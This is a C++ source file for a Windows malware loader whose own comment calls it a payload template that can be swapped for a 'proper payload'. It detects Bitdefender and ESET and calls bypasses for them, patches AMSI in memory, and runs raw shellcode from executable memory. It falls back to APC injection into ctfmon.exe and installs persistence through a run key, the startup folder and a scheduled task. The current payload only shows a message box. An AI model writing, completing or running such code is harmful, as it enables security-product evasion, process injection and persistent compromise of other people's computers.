// complete example payload for now (you can modify it easily to change it to a proper payload)

#include "main.h"
#include <iostream>
#include <fstream>
#include <memory>
#include <sstream>
#include <string>

std::string mainprogram::base64_decode(const std::string& encoded) {
    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int in_len = encoded.size();
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;
    while (in_len-- && (encoded[in_] != '=') && isalnum(encoded[in_]) || (encoded[in_] == '+') || (encoded[in_] == '/')) {
        char_array_4[i++] = encoded[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; (i < 3); i++)ret += char_array_3[i];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 4; j++)char_array_4[j] = 0;
        for (j = 0; j < 4; j++)char_array_4[j] = base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; (j < i - 1); j++)ret += char_array_3[j];
    }
    return ret;
}
bool mainprogram::checkmodule(const std::wstring& modulename) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetCurrentProcessId());
    if (snap == INVALID_HANDLE_VALUE) return false;
    MODULEENTRY32W me;
    me.dwSize = sizeof(me);
    bool found = false;
    if (Module32FirstW(snap, &me)) {
        do {
            if (_wcsicmp(me.szModule, modulename.c_str()) == 0) {
                found = true;
                break;
            }
        } while (Module32NextW(snap, &me));
    }
    CloseHandle(snap);
    return found;
}
bool mainprogram::checkavmodules() {
    std::vector<std::wstring> avmodules = {
        L"bdscan.dll", L"bdselfpr.sys", L"avcuf64.dll", // Bitdefender
        L"eamsi.dll", L"ehdrv.sys", L"ekrn.exe", // ESET
        L"amsi.dll", // Windows AMSI
        L"aswamsi.dll", // Avast
        L"avamsi.dll", // AVG
        L"mfeesp.dll", // McAfee
        L"symamsi.dll", // Symantec
        L"bpamsi.dll", // Bullguard
        L"ccamsi.dll", // Comodo
        L"klamsi.dll", // Kaspersky
        L"pavamsi.dll" // Panda
    };
    for (const auto& module : avmodules) {
        if (checkmodule(module)) {
            std::wcout << L"Found module: " << module << L"\n";
            if (module.find(L"bd") != std::wstring::npos) return true; // Bitdefender
            if (module.find(L"ea") != std::wstring::npos) return true; // ESET
        }
    }
    return false;
}
std::string loadbase64(const std::string& filename) {
    std::ifstream file(filename);
    if (!file) {
        return "";
    }
    std::stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

/*std::vector<BYTE> mainprogram::getpayload() {
    std::string encoded = "ICAgIDB4NTUsIDB4NDgsIDB4ODksIDB4RTUsIDB4NDgsIDB4ODMsIDB4RUMsIDB4MjAsIDB4NDgsIDB4MzEsIDB4QzksIDB4NjUsIDB4NDgsIDB4OEIsIDB4MDQsIDB4MjUsCiAgICAweDYwLCAweDAwLCAweDAwLCAweDAwLCAweDQ4LCAweDhCLCAweDQwLCAweDE4LCAweDQ4LCAweDhCLCAweDcwLCAweDIwLCAweDQ4LCAweEFELCAweDQ4LCAweDk2LAogICAgMHg0OCwgMHhBRCwgMHg0OCwgMHg4QiwgMHg1OCwgMHgyMCwgMHg0OSwgMHg4OSwgMHhERSwgMHg0RCwgMHg4OSwgMHhGMCwgMHg0MSwgMHg4QiwgMHg0MCwgMHgzQywKICAgIDB4NDQsIDB4OEIsIDB4OTQsIDB4MDAsIDB4ODgsIDB4MDAsIDB4MDAsIDB4MDAsIDB4NEMsIDB4MDEsIDB4QzIsIDB4NDUsIDB4OEIsIDB4NTIsIDB4MTgsIDB4NDUsCiAgICAweDhCLCAweDVBLCAweDIwLCAweDRELCAweDAxLCAweEMzLCAweDQ5LCAweEZGLCAweENBLCAweDQzLCAweDhCLCAweDM0LCAweDkzLCAweDRDLCAweDAxLCAweEM2LAogICAgMHg0OCwgMHhCOCwgMHg2MSwgMHg3MiwgMHg3OSwgMHg0MSwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0OCwgMHhCQiwgMHg0QywgMHg2RiwgMHg2MSwgMHg2NCwKICAgIDB4NEMsIDB4NjksIDB4NjIsIDB4NzIsIDB4NDgsIDB4MzksIDB4MUUsIDB4NzUsIDB4RTYsIDB4NDgsIDB4MzksIDB4NDYsIDB4MDgsIDB4NzUsIDB4RTAsIDB4NDQsCiAgICAweDhCLCAweDVBLCAweDI0LCAweDRELCAweDAxLCAweEMzLCAweDY2LCAweDQyLCAweDBGLCAweEI3LCAweDBDLCAweDUzLCAweDQ0LCAweDhCLCAweDVBLCAweDFDLAogICAgMHg0RCwgMHgwMSwgMHhDMywgMHg0MSwgMHg4QiwgMHgwNCwgMHg4QiwgMHg0OSwgMHgwMSwgMHhDMCwgMHg0OSwgMHg4OSwgMHhDNywgMHg0OCwgMHg4RCwgMHgwRCwKICAgIDB4OTQsIDB4MDAsIDB4MDAsIDB4MDAsIDB4NDgsIDB4MjksIDB4RjksIDB4NDgsIDB4MDEsIDB4RTksIDB4NDEsIDB4RkYsIDB4RDcsIDB4NDksIDB4ODksIDB4QzUsCiAgICAweDRELCAweDg5LCAweEU4LCAweDQxLCAweDhCLCAweDQwLCAweDNDLCAweDQ0LCAweDhCLCAweDk0LCAweDAwLCAweDg4LCAweDAwLCAweDAwLCAweDAwLCAweDRDLAogICAgMHgwMSwgMHhDMiwgMHg0NSwgMHg4QiwgMHg1MiwgMHgxOCwgMHg0NSwgMHg4QiwgMHg1QSwgMHgyMCwgMHg0RCwgMHgwMSwgMHhDMywgMHg0OSwgMHhGRiwgMHhDQSwKICAgIDB4NDMsIDB4OEIsIDB4MzQsIDB4OTMsIDB4NEMsIDB4MDEsIDB4QzYsIDB4NDgsIDB4QjgsIDB4NkYsIDB4NzgsIDB4NDEsIDB4NjEsIDB4MDAsIDB4MDAsIDB4MDAsCiAgICAweDAwLCAweDQ4LCAweEJCLCAweDRELCAweDY1LCAweDczLCAweDczLCAweDYxLCAweDY3LCAweDY1LCAweDQyLCAweDQ4LCAweDM5LCAweDFFLCAweDc1LCAweEU2LAogICAgMHg0OCwgMHgzOSwgMHg0NiwgMHgwOCwgMHg3NSwgMHhFMCwgMHg0NCwgMHg4QiwgMHg1QSwgMHgyNCwgMHg0RCwgMHgwMSwgMHhDMywgMHg2NiwgMHg0MiwgMHgwRiwKICAgIDB4QjcsIDB4MEMsIDB4NTMsIDB4NDQsIDB4OEIsIDB4NUEsIDB4MUMsIDB4NEQsIDB4MDEsIDB4QzMsIDB4NDEsIDB4OEIsIDB4MDQsIDB4OEIsIDB4NDksIDB4MDEsCiAgICAweEMwLCAweDRELCAweDMxLCAweEM5LCAweDRDLCAweDhELCAweDA1LCAweDJDLCAweDAwLCAweDAwLCAweDAwLCAweDRDLCAweDI5LCAweEY4LCAweDQ4LCAweDAxLAogICAgMHhFOCwgMHg0OCwgMHg4RCwgMHgxNSwgMHgyNywgMHgwMCwgMHgwMCwgMHgwMCwgMHg0OCwgMHgyOSwgMHhGQSwgMHg0OCwgMHgwMSwgMHhFQSwgMHg0OCwgMHgzMSwKICAgIDB4QzksIDB4RkYsIDB4RDAsIDB4NDgsIDB4ODksIDB4RUMsIDB4NUQsIDB4QzMsIDB4NzUsIDB4NzMsIDB4NjUsIDB4NzIsIDB4MzMsIDB4MzIsIDB4MkUsIDB4NjQsCiAgICAweDZDLCAweDZDLCAweDAwLCAweDU0LCAweDY1LCAweDczLCAweDc0LCAweDAwLCAweDYyLCAweDc5LCAweDcwLCAweDYxLCAweDczLCAweDczLCAweDIwLCAweDc0LAogICAgMHg2NSwgMHg3MywgMHg3NCwgMHgwMA=="; // messagebox
    std::string decoded = base64_decode(encoded);
    std::vector<BYTE> payload(decoded.begin(), decoded.end());
    return payload;
}*/
std::vector<BYTE> mainprogram::getpayload() {
    std::vector<BYTE> payload = {
        0x55,                               // push rbp
        0x48, 0x89, 0xE5,                   // mov rbp, rsp
        0x48, 0x83, 0xEC, 0x20,             // sub rsp, 0x20 (shadow space)
        0x48, 0x31, 0xC9,                   // xor rcx, rcx
        0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, gs:[0x60] (PEB)
        0x48, 0x8B, 0x40, 0x18,             // mov rax, [rax+0x18] (PEB->Ldr)
        0x48, 0x8B, 0x70, 0x20,             // mov rsi, [rax+0x20] (InMemoryOrderModuleList)
        0x48, 0xAD,                         // lodsq (ntdll.dll)
        0x48, 0x96,                         // xchg rax, rsi
        0x48, 0xAD,                         // lodsq (kernel32.dll)
        0x48, 0x8B, 0x58, 0x20,             // mov rbx, [rax+0x20] (kernel32 base)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, MessageBoxA addr (will patch)
        0x48, 0x31, 0xC9,                   // xor rcx, rcx    (hWnd = NULL)
        0x48, 0xB9, 0x62, 0x79, 0x70, 0x61, 0x73, 0x73, 0x20, 0x74, // mov rcx, "bypass t"
        0x48, 0xC7, 0xC1, 0x65, 0x73, 0x74, 0x00,             // mov rcx+8, "est\0"
        0x48, 0x89, 0xCA,                   // mov rdx, rcx    (lpText)
        0x48, 0xB9, 0x54, 0x65, 0x73, 0x74, 0x00, 0x00, 0x00, 0x00, // mov rcx, "Test\0" (caption)
        0x48, 0x89, 0xC9,                   // mov rcx, rax    (hWnd)
        0x48, 0x31, 0xD2,                   // xor rdx, rdx    (uType = MB_OK)
        0xFF, 0xD0,                         // call rax
        0x48, 0x89, 0xEC,                   // mov rsp, rbp
        0x5D,                               // pop rbp
        0xC3                                // ret
    };
    HMODULE user32 = LoadLibraryA("user32.dll");
    if (user32) {
        FARPROC msgbox = GetProcAddress(user32, "MessageBoxA");
        if (msgbox) {
            uint64_t addr = (uint64_t)msgbox;
            memcpy(&payload[47], &addr, sizeof(addr));
        }
        FreeLibrary(user32);
    }
    return payload;
}
/*std::vector<BYTE> mainprogram::virtualize_payload(const std::vector<BYTE>& payload) {
    std::cout << "[debug] Starting virtualization...\n";
    virtualizer vm;
    std::cout << "[debug] Virtualizer created\n";
    auto virtualized = vm.virtualize(payload);
    std::cout << "[debug] Virtualized size: " << virtualized.size() << "\n";
    if (virtualized.empty()) {
        std::cout << "[err] Virtualizer returned empty payload!\n";
        return {};
    }
    std::vector<BYTE> loader = {
        0x48, 0x83, 0xEC, 0x28,             // sub rsp, 28h (shadow space)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, &virtualized_code
        0xFF, 0xD0,                         // call rax
        0x48, 0x83, 0xC4, 0x28,             // add rsp, 28h
        0xC3                                // ret
    };
    size_t total_size = loader.size() + virtualized.size();
    std::vector<BYTE> final_payload(total_size);
    std::cout << "[debug] Total size: " << total_size << "\n";
    memcpy(final_payload.data(), loader.data(), loader.size());
    uint64_t virt_addr = (uint64_t)(loader.size()); // Offset to virtualized code
    memcpy(final_payload.data() + 6, &virt_addr, sizeof(virt_addr));
    memcpy(final_payload.data() + loader.size(), virtualized.data(), virtualized.size());
    std::cout << "[debug] Final payload created, size: " << final_payload.size() << "\n";
    return final_payload;
}*/
std::vector<BYTE> mainprogram::virtualize_payload(const std::vector<BYTE>& payload) {
    std::cout << "[debug] SKIPPING virtualization (buggy)\n";
    std::vector<BYTE> loader = {
        0x48, 0x83, 0xEC, 0x28,             // sub rsp, 28h
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, &payload
        0xFF, 0xD0,                         // call rax
        0x48, 0x83, 0xC4, 0x28,             // add rsp, 28h
        0xC3                                // ret
    };
    size_t total_size = loader.size() + payload.size();
    std::vector<BYTE> final_payload(total_size);
    memcpy(final_payload.data(), loader.data(), loader.size());
    uint64_t payload_addr = (uint64_t)(final_payload.data() + loader.size());
    memcpy(final_payload.data() + 6, &payload_addr, 8);
    memcpy(final_payload.data() + loader.size(), payload.data(), payload.size());
    return final_payload;
}
bool mainprogram::execute_virtualized(const std::vector<BYTE>& virtualized) {
    LPVOID mem = VirtualAlloc(NULL, virtualized.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return false;
    memcpy(mem, virtualized.data(), virtualized.size());
    DWORD old;
    VirtualProtect(mem, virtualized.size(), PAGE_EXECUTE_READWRITE, &old); 
    FlushInstructionCache(GetCurrentProcess(), mem, virtualized.size());
    VirtualProtect(mem, virtualized.size(), PAGE_EXECUTE_READ, &old); 
    __try {
        ((void(*)())mem)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return false;
    }
    VirtualFree(mem, 0, MEM_RELEASE);
    return true;
}
bool mainprogram::checkenvironment() {
    antianalysis aa;
    if (aa.runallchecks()) {
        std::cout << "analysis environment detected\n";
        return false;
    }
    return true;
}
void mainprogram::cleanup() {
    persistence p;
    p.cleanup();
}
/*bool execute_via_threadpool(std::vector<BYTE>& payload) {
    threadpool pool(4);
    auto future = pool.enqueue([&payload]() -> bool {
        LPVOID exec_mem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!exec_mem) return false;
        memcpy(exec_mem, payload.data(), payload.size());
        HANDLE hthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        if (!hthread) {
            VirtualFree(exec_mem, 0, MEM_RELEASE);
            return false;
        }
        WaitForSingleObject(hthread, INFINITE);
        CloseHandle(hthread);
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return true;
        });
    return future.get();
}*/
void mainprogram::run() {
    // check env is broken some reason lol
    // if (!checkenvironment())return;
    std::cout << "[debug] starting bypasses...\n";
    bool hasbitdefender = false;
    bool haseset = false;
    if (checkmodule(L"bdscan.dll") || checkmodule(L"bdselfpr.sys")) {
        std::cout << "[debug] Bitdefender detected\n";
        hasbitdefender = true;
    }
    if (checkmodule(L"eamsi.dll") || checkmodule(L"ekrn.exe")) {
        std::cout << "[debug] ESET detected\n";
        haseset = true;
    }
    if (hasbitdefender) {
        bitdefenderbypass bd;
        if (bd.bypass()) std::cout << "[debug] Bitdefender bypassed\n";
    }
    if (haseset) {
        esetbypass eb;
        if (eb.bypass()) std::cout << "[debug] ESET bypassed\n";
    }
    amsibypass amsi;
    amsi.memorypatch();
    std::cout << "[debug] amsi bypassed\n";
    //unhooker uh;
    //uh.unhookall();
    //std::cout << "[debug] unhooking done\n";
    hardwarebreakpoint hbp;
    hbp.bypass();
    std::cout << "[debug] hardware breakpoint amsi bypassed\n";
    std::cout << "[debug] getting payload...\n";
    std::vector<BYTE> payload = getpayload();
    if (payload.empty()) {
        std::cout << "[err] no payload\n";
        return;
    }
    std::cout << "[debug] payload size: " << payload.size() << "\n";
    std::cout << "[debug] virtualizing payload...\n";
    auto virtualized = virtualize_payload(payload);
    std::cout << "[debug] virtualized size: " << virtualized.size() << "\n";
    std::cout << "[debug] executing in memory\n";
    if (execute_virtualized(virtualized)) {
        std::cout << "[debug] in-memory execution success\n";
    }
    /*else if (execute_via_threadpool(virtualized)) {
        std::cout << "[debug] threadpool execution success\n";
    }*/
    else {
        std::cout << "[debug] fallback to injection...\n";
        injection inj;
        DWORD pid = inj.findprocess(L"ctfmon.exe");
        if (pid != 0) {
            if (inj.apcinject(pid, virtualized)) {
                std::cout << "[debug] injection success\n";
            }
        }
    }
    std::cout << "[debug] installing persistence...\n";
    wchar_t exepath[MAX_PATH];
    GetModuleFileNameW(NULL, exepath, MAX_PATH);
    persistence pers;
    pers.runkey(exepath);
    pers.startupfolder(exepath);
    pers.scheduledtask(exepath);
    std::cout << "[debug] persistence installed\n";
    std::cout << "[debug] cleanup...\n";
    cleanup();
    std::cout << "[debug] done\n";
}
int main() {
    mainprogram prog;
    prog.run();
    return 0;
}